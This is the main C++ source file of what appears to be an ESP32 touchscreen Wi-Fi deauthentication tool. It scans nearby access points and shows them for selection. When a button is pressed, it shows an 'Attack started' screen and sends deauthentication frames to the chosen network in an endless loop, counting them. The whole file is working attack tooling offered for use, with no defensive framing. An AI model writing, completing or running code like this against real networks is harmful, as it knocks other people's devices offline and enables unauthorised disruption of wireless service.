#include "CST820.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "nvs_flash.h"

#include <SPI.h>
#include <TFT_eSPI.h>

#include "deauth.h"
#include "utils.h"

#define I2C_SDA 33
#define I2C_SCL 32
#define TP_RST 25
#define TP_INT 21

#define SCREEN_HEIGHT 320
#define SCREEN_WIDTH 240

#define AP_RECORD_LIMIT 40

CST820 touch(I2C_SDA, I2C_SCL, TP_RST, TP_INT);
TFT_eSPI tft = TFT_eSPI();

wifi_ap_record_t apRecords[AP_RECORD_LIMIT];
int selectedApRecord = 0;
uint16_t apRecordCount;
bool attackStarted = false;
int frameCounter = 0;

void clearLine(int y, int fs) {
    tft.fillRect(0, y, SCREEN_WIDTH, fs * 8, TFT_BLACK);
}

void drawHeader(char *title, uint16_t bg) {
    tft.fillRect(0, 0, SCREEN_WIDTH, 16, bg);
    tft.setTextColor(TFT_WHITE, bg);
    tft.drawCentreString(title, SCREEN_WIDTH / 2, 0, 2);
}

void setup() {
    Serial.begin(115200);

    initPins();
    initDisplay();

    ESP_ERROR_CHECK(nvs_flash_init());

    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawCentreString("Scanning Networks...", SCREEN_WIDTH / 2, 10, 1);

    ESP_ERROR_CHECK(esp_event_loop_create_default());

    // Init WIFI
    wifi_init_config_t config = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&config));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    // Start wifi scan
    ESP_ERROR_CHECK(esp_wifi_scan_start(NULL, true));

    uint16_t apCount;
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&apCount));

    clearLine(10, 1);
    tft.drawCentreString("Scanned " + String(apCount) + " Networks",
                         SCREEN_WIDTH / 2, 10, 1);

    apRecordCount = AP_RECORD_LIMIT;

    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&apRecordCount, apRecords));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
}

void loop() {
    // Handle Touches
    bool touched;
    uint8_t gesture;
    uint16_t touchX, touchY;

    touched = touch.getTouch(&touchX, &touchY, &gesture);

    if (touchY > 10) {
        if (touchY > SCREEN_HEIGHT / 2) {
            selectedApRecord++;
            delay(300);
        } else if (touchY < SCREEN_HEIGHT / 2) {
            selectedApRecord--;
            delay(300);
        }
    }

    // Handle button
    if (!digitalRead(0)) {
        attackStarted = true;
        delay(300);
    }

    // Limit Selector
    if (selectedApRecord < 0) {
        selectedApRecord = apRecordCount - 1;
    } else if (selectedApRecord > apRecordCount - 1) {
        selectedApRecord = 0;
    }

    if (attackStarted) {
        tft.fillScreen(TFT_BLACK);
        for (int i = 3; i > 0; i--) {
            tft.drawCentreString("Attack starts in " + String(i),
                                 SCREEN_WIDTH / 2, 10, 1);
            delay(1000);
            clearLine(10, 1);
        }
        // redLED();

        tft.drawCentreString("Attack started", SCREEN_WIDTH / 2, 10, 1);
        tft.setCursor(0, 30);
        tft.print("SSID   : ");
        tft.print((char *)apRecords[selectedApRecord].ssid);
        tft.setCursor(0, 40);
        tft.print("BSSID  : ");
        for (int i = 0; i < 6; i++) {
            tft.printf("%x", apRecords[selectedApRecord].bssid[i]);
            if (i != 5) {
                tft.print(":");
            }
        }
        tft.setCursor(0, 50);
        tft.print("Channel: ");
        tft.print(apRecords[selectedApRecord].primary);
        tft.setCursor(0, 60);
        tft.print("RSSI   : ");
        tft.print(apRecords[selectedApRecord].rssi);
        tft.setCursor(0, 70);
        tft.print("AUTH   : ");
        tft.print(get_auth_mode(apRecords[selectedApRecord].authmode));
        tft.setCursor(0, 80);
        tft.print("WPS    : ");
        tft.print(apRecords[selectedApRecord].wps ? "ENABLED" : "DISABLED");

        tft.setTextColor(TFT_RED, TFT_BLACK);

        tft.drawCentreString("created by knid <dev@knid.me>", SCREEN_WIDTH / 2,
                             280, 1);
        tft.drawCentreString("github.com/knid", SCREEN_WIDTH / 2, 290, 1);

        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        while (1) {
            send_deauth_frame_to_ap(apRecords[selectedApRecord]);
            frameCounter++;
            tft.drawCentreString("Sent " + String(frameCounter) + " frames!",
                                 SCREEN_WIDTH / 2, 100, 1);
            delay(100);
        }

    } else {

        for (int i = 0; i < apRecordCount; i++) {
            if (selectedApRecord == i) {
                tft.setTextColor(TFT_BLACK, TFT_LIGHTGREY);
            }

            tft.setCursor(0, (i * 10) + 30);
            tft.print(i + 1);
            tft.print(": ");
            tft.print((char *)apRecords[i].ssid);
            tft.print(" (");
            tft.print(apRecords[i].rssi);
            tft.print(")");

            tft.setTextColor(TFT_WHITE, TFT_BLACK);
        }
    }
}
